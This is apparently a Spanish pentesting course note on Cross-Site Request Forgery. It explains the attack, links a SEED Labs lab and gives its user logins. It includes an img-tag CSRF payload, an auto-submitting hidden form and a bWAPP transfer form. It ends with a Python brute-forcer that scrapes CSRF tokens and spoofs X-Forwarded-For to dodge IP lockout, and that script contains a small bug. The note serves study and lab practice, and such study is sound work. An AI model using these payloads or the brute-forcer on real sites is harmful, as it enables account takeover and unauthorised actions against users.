# Cross-Site Request Forgery (CSRF o XSRF)

Tags: #CSRF #OWASP #Explotacion 

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado.

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

-   **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
```bash 
# Usuarios del lab 
alice:seedalice
samy:seedsamy
```

## HTML
En el CSRF podemos modificar todos aquellos campos en donde no sea necesaria una autenticación en caso de no tener las credenciales. Pero si las tenemos claro que podemos modificar cualquier tipo de campo. 
* Son muy comunes en ataques de phishing
* La persona debe de estar logeada en la web donde esta el CSRF, y al momento de que abra el enlace, este pueda hacer los cambios como (Passwd, campos críticos, etc...)


Este tipo de scripts se deben de hacer en html, en donde sabemos que podemos hacer acciones en el mismo sitio tramitando data con la url.
```html
<img src="http://www.seed-server.com/action/friends/add?friend=57" alt="image" width="1" height="1" />  <!-- Enviaremos un html de una 'imagen' con un codigo-->
```
Desde la parte de action es para agregar un amigo en el lab de la pagina anterior. Por lo que al momento de mandarlo a alguien y este abra el correo o url, automáticamente se le agregara el amigo con ese identificador que en este caso es 57.  La acción va de la mano con el identificador del usuario a atacar.


```html
<html>
  <body>
    <form action="http://dominio/recurso" method="GET/POST">
      <input type="hidden" name="appsec" value="appsec" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


```html 
<div id="main">
    
    <h1>CSRF (Transfer Amount)</h1>

    <p>Amount on your account: <b> 1000 EUR</b></p>

    <form action="[http://bwapp.xyz/csrf_2.php](view-source:http://bwapp.xyz/csrf_2.php)" method="GET">

        <p><label for="account">Account to transfer:</label><br />
        <input type="text" id="account" name="account" value="223-45678-90"></p>

        <p><label for="amount">Amount to transfer:</label><br />
        <input type="text" id="amount" name="amount" value="100"></p>

        <button type="submit" name="action" value="transfer">Transfer</button>   

    </form>
    
</div>
```

## Login con CSRF Token 

```python
# Este script sirve para hacer 'Fuerza bruta' a un panel de login en donde tendremos que usar un 'CSRF Token' dinamico, ademas de, cambiar la IP para evitar el bloqueo.

#!/usr/bin/env python3 

from pwn import *
import requests, pdb, signal , sys, time , re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://IP/admin/login"

def brute_force():
	s = requests.session()
	f = open("diccionary.txt", "r")   # Abrimos el archivo de passwords 
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	time.sleep(2)
	counter = 1 
	
	for password in f.readlines():
		password = password.strip('\n')   # Quitamos el salto de linea que agrega automaticamente 
		p1.status("Probando la password [%d/349]: %s" % (counter,password))
		r = s.get(main_url)
		token = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]
		post_data = {
			'tokenCSRF': token,
			'username': admin,
			'password': '%s' % password,
			'save': ''
		} 
		
		headers = {
			'X-Forwarded-For': '%s' % password  # Agregar la cabecera para cambiar la IP por una palabra
		}

		r = s.post(main_url, data=post_data, headers=headers)
		counter += 1

		if "Username or password incorrect" not in r.text:
			p1.success("La password es -> %s" % password)
			break

if __name__ == '__main__':
	brute_force()

```